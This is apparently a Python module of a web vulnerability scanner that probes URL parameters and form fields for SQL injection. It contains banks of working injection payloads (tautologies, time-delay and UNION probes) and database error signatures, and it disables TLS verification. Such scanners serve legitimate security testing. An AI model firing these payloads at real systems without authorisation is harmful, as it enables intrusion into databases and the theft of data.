"""
VulnScanX — SQL Injection Scanner
===================================
Detects error-based SQLi, time-based blind SQLi, and boolean-based blind SQLi.
Supports MySQL, PostgreSQL, MSSQL, Oracle, and SQLite fingerprinting.

OWASP Top 10 2025: A05 – Injection
"""

import re
import time
import urllib.parse
from typing import List, Optional, Tuple

import requests
from bs4 import BeautifulSoup

from core import BaseModule, Finding, Severity

# ---------------------------------------------------------------------------
# Payload banks
# ---------------------------------------------------------------------------
ERROR_PAYLOADS = [
    # Generic / ANSI
    "'",
    "''",
    "`",
    '"',
    "\\",
    # MySQL
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "'; SELECT SLEEP(0); --",
    # PostgreSQL
    "'; SELECT pg_sleep(0); --",
    "' OR 1=1/*",
    # MSSQL
    "' OR 1=1--",
    "'; WAITFOR DELAY '0:0:0'; --",
    # Oracle
    "' OR 1=1 FROM DUAL --",
    # UNION-based probes
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
]

TIME_PAYLOADS = [
    # MySQL
    ("' AND SLEEP(5) --",       "mysql",   5),
    ("1 AND SLEEP(5)",           "mysql",   5),
    # PostgreSQL
    ("'; SELECT pg_sleep(5); --", "postgres", 5),
    ("1; SELECT pg_sleep(5) --",  "postgres", 5),
    # MSSQL
    ("'; WAITFOR DELAY '0:0:5'; --", "mssql", 5),
    ("1; WAITFOR DELAY '0:0:5'--",   "mssql", 5),
    # SQLite
    ("1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))","sqlite", 5),
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),  # true / false pair
    ("1 AND 1=1",    "1 AND 1=2"),
]

# DB error signatures for fingerprinting
DB_ERRORS = {
    "mysql":    [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"supplied argument is not a valid mysql", re.I),
        re.compile(r"mysql_fetch_array\(\)", re.I),
        re.compile(r"warning: mysql", re.I),
    ],
    "postgresql": [
        re.compile(r"pg_query\(\):", re.I),
        re.compile(r"supplied argument is not a valid PostgreSQL", re.I),
        re.compile(r"PostgreSQL.*ERROR", re.I),
    ],
    "mssql": [
        re.compile(r"microsoft OLE DB provider for ODBC drivers", re.I),
        re.compile(r"Unclosed quotation mark after the character string", re.I),
        re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.I),
        re.compile(r"Incorrect syntax near", re.I),
    ],
    "oracle": [
        re.compile(r"ORA-\d{5}", re.I),
        re.compile(r"oracle error", re.I),
    ],
    "sqlite": [
        re.compile(r"SQLite3::", re.I),
        re.compile(r"sqlite_query\(\)", re.I),
        re.compile(r"unable to open database file", re.I),
    ],
    "generic": [
        re.compile(r"sql syntax.*error", re.I),
        re.compile(r"database error", re.I),
        re.compile(r"sql statement", re.I),
        re.compile(r"jdbc error", re.I),
        re.compile(r"db2 sql error", re.I),
    ],
}


class SQLiScanner(BaseModule):
    """
    Multi-technique SQL Injection scanner.

    Techniques implemented:
    - Error-Based   : Injects payloads and looks for DB error messages
    - Time-Based    : Measures response time delta for blind injection
    - Boolean-Based : Compares response content diff for true/false pairs
    - UNION-Based   : Probes column count via UNION SELECT NULL chains
    """

    NAME        = "sqli_scanner"
    DESCRIPTION = "Detects SQL Injection (error, time-based, boolean, UNION)"
    TAGS        = ["sqli", "injection", "owasp-a05"]

    def __init__(self, config: dict = None):
        super().__init__(config)
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "VulnScanX/1.0 (Security Research)"
        })
        self.session.verify = False
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.time_threshold = self.config.get("time_threshold", 4.0)

    # -------------------------------------------------------------- public
    def run(self, target: str) -> List[Finding]:
        findings: List[Finding] = []
        target = self._normalize_url(target)
        self.log(f"[SQLi] Starting scan → {target}")

        try:
            # URL params
            findings.extend(self._scan_url_params(target))
            # Forms
            findings.extend(self._scan_forms(target))
        except requests.RequestException as e:
            self.log(f"[SQLi] Network error: {e}")

        self.log(f"[SQLi] Found {len(findings)} SQLi issues")
        return findings

    # --------------------------------------------------------- URL params
    def _scan_url_params(self, url: str) -> List[Finding]:
        findings = []
        parsed   = urllib.parse.urlparse(url)
        params   = urllib.parse.parse_qs(parsed.query)

        if not params:
            params = {"id": ["1"], "page": ["1"], "cat": ["1"]}

        for param in params:
            findings.extend(self._test_error_based(url, param, "GET"))
            findings.extend(self._test_time_based(url, param, "GET"))
            findings.extend(self._test_boolean_based(url, param, "GET"))
            if findings:
                break  # stop after first confirmed vulnerable param

        return findings

    # --------------------------------------------------------- Forms
    def _scan_forms(self, url: str) -> List[Finding]:
        findings = []
        try:
            resp = self.session.get(url, timeout=self.timeout)
        except Exception:
            return findings

        soup  = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = urllib.parse.urljoin(url, form.get("action", ""))
            method = form.get("method", "get").lower()
            inputs = form.find_all(["input", "textarea"])

            for inp in inputs:
                name = inp.get("name", "")
                if not name or inp.get("type") in ("submit", "hidden", "button"):
                    continue
                findings.extend(self._test_error_based(action, name, method.upper()))
                findings.extend(self._test_time_based(action, name, method.upper()))

        return findings

    # ============================================================ techniques
    def _test_error_based(
        self, url: str, param: str, method: str = "GET"
    ) -> List[Finding]:
        findings = []
        for payload in ERROR_PAYLOADS:
            try:
                resp, _ = self._send(url, param, payload, method)
                db_type, pattern = self._detect_db_error(resp.text)
                if db_type:
                    findings.append(self._build_finding(
                        technique   = "Error-Based",
                        db_type     = db_type,
                        url         = url,
                        parameter   = param,
                        payload     = payload,
                        evidence    = self._extract_error(resp.text, pattern),
                        cvss_score  = 9.8,
                        severity    = Severity.CRITICAL,
                        description = (
                            f"Error-based SQL injection detected in '{param}' parameter. "
                            f"Database: {db_type.upper()}. The server returned a raw DB error "
                            "message revealing internal structure."
                        ),
                    ))
                    break  # one confirmed finding per param
            except Exception:
                pass
        return findings

    def _test_time_based(
        self, url: str, param: str, method: str = "GET"
    ) -> List[Finding]:
        findings = []
        # Establish baseline
        try:
            _, baseline = self._send(url, param, "1", method)
        except Exception:
            return findings

        for payload, db_type, delay in TIME_PAYLOADS:
            try:
                _, elapsed = self._send(url, param, payload, method)
                delta = elapsed - baseline
                if delta >= self.time_threshold:
                    findings.append(self._build_finding(
                        technique  = "Time-Based Blind",
                        db_type    = db_type,
                        url        = url,
                        parameter  = param,
                        payload    = payload,
                        evidence   = f"Response delayed {delta:.2f}s (baseline: {baseline:.2f}s, threshold: {self.time_threshold}s)",
                        cvss_score = 9.0,
                        severity   = Severity.CRITICAL,
                        description = (
                            f"Time-based blind SQL injection detected in '{param}'. "
                            f"Payload caused a {delta:.2f}s delay, confirming server-side execution."
                        ),
                    ))
                    return findings  # one confirmed is enough
            except Exception:
                pass
        return findings

    def _test_boolean_based(
        self, url: str, param: str, method: str = "GET"
    ) -> List[Finding]:
        findings = []
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            try:
                resp_true,  _ = self._send(url, param, true_payload,  method)
                resp_false, _ = self._send(url, param, false_payload, method)
                if (resp_true.status_code == 200
                        and resp_false.status_code != 200):
                    findings.append(self._build_finding(
                        technique  = "Boolean-Based Blind",
                        db_type    = "unknown",
                        url        = url,
                        parameter  = param,
                        payload    = f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence   = (
                            f"TRUE payload → HTTP {resp_true.status_code} ({len(resp_true.text)} bytes); "
                            f"FALSE payload → HTTP {resp_false.status_code} ({len(resp_false.text)} bytes)"
                        ),
                        cvss_score = 8.6,
                        severity   = Severity.HIGH,
                        description = (
                            f"Boolean-based blind SQL injection in '{param}'. "
                            "Server responds differently for true vs false conditions."
                        ),
                    ))
                    break
            except Exception:
                pass
        return findings

    # ------------------------------------------------------------ helpers
    def _send(
        self, url: str, param: str, payload: str, method: str
    ) -> Tuple[requests.Response, float]:
        parsed   = urllib.parse.urlparse(url)
        params   = urllib.parse.parse_qs(parsed.query)
        params   = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        params[param] = payload

        t0 = time.time()
        if method == "POST":
            resp = self.session.post(url, data=params, timeout=self.timeout + 8)
        else:
            resp = self.session.get(url, params=params, timeout=self.timeout + 8)
        elapsed = time.time() - t0
        return resp, elapsed

    @staticmethod
    def _detect_db_error(body: str) -> Tuple[Optional[str], Optional[re.Pattern]]:
        for db_type, patterns in DB_ERRORS.items():
            for p in patterns:
                if p.search(body):
                    return db_type, p
        return None, None

    @staticmethod
    def _extract_error(body: str, pattern: re.Pattern, window: int = 200) -> str:
        match = pattern.search(body)
        if not match:
            return "DB error detected in response"
        start = max(0, match.start() - 40)
        end   = min(len(body), match.end() + window)
        return "..." + body[start:end].strip() + "..."

    @staticmethod
    def _build_finding(
        technique: str, db_type: str, url: str, parameter: str,
        payload: str, evidence: str, cvss_score: float,
        severity: Severity, description: str,
    ) -> Finding:
        return Finding(
            title       = f"SQL Injection ({technique}) in '{parameter}'",
            severity    = severity,
            cvss_score  = cvss_score,
            target      = url.split("?")[0],
            url         = url,
            parameter   = parameter,
            payload     = payload,
            evidence    = evidence,
            module      = "sqli_scanner",
            description = description,
            remediation = (
                "1. Use parameterized queries / prepared statements exclusively. "
                "2. Apply strict input validation and whitelist allowed characters. "
                "3. Use an ORM and avoid raw SQL string concatenation. "
                "4. Implement least-privilege DB accounts. "
                "5. Enable WAF rules for SQL injection patterns."
            ),
            tags        = ["sqli", f"technique:{technique}", f"db:{db_type}", "owasp-a05"],
            references  = [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
                "https://portswigger.net/web-security/sql-injection",
            ],
        )

    @staticmethod
    def _normalize_url(url: str) -> str:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        return url.rstrip("/")
